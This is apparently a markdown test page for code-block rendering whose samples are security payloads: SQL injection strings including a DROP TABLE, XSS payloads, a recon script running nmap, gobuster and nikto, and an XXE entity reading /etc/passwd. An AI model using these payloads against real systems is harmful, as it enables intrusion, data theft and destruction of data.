# Code Blocks Test

Testing various code blocks with syntax highlighting and copy buttons.

## Python Code

```python
def exploit_sqli(url, payload):
    """
    SQL Injection exploit test
    """
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json'
    }

    data = {
        'username': payload,
        'password': "' OR '1'='1"
    }

    response = requests.post(url, json=data, headers=headers)
    return response.status_code == 200
```

## JavaScript XSS Payload

```javascript
// XSS Test Payloads
const xssPayloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>'
];

function testXSS(target) {
    xssPayloads.forEach(payload => {
        fetch(target, {
            method: 'POST',
            body: JSON.stringify({ input: payload })
        });
    });
}
```

## SQL Injection

```sql
-- SQL Injection payloads
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password';

SELECT * FROM users WHERE id = 1 UNION SELECT null, username, password FROM admin_users;

SELECT * FROM products WHERE id = 1; DROP TABLE users; --
```

## JSON Response

```json
{
  "status": "vulnerable",
  "findings": [
    {
      "severity": "critical",
      "title": "SQL Injection in login form",
      "cve": "CVE-2024-1234",
      "affected_parameter": "username"
    },
    {
      "severity": "high",
      "title": "XSS in search functionality",
      "urls": [
        "https://target.com/search?q=<script>alert(1)</script>"
      ]
    }
  ]
}
```

## Bash Commands

```bash
#!/bin/bash
# Reconnaissance script

target="192.168.1.1"

nmap -sV -sC -oN scan.txt $target

gobuster dir -u http://$target \
    -w /usr/share/wordlists/dirb/common.txt \
    -o gobuster.txt

nikto -h http://$target -o nikto.txt
```

## HTTP Request

```http
POST /api/login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

{
  "username": "admin' OR '1'='1",
  "password": "password123"
}
```

## HTML/CSS

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .exploit { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div class="exploit">Test XSS: <script>alert('XSS')</script></div>
</body>
</html>
```

```css
/* Stylesheet test */
.vulnerable-element {
    background: url('javascript:alert(1)');
    color: #ff0000;
}
```

## XML Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <data>&xxe;</data>
</root>
```
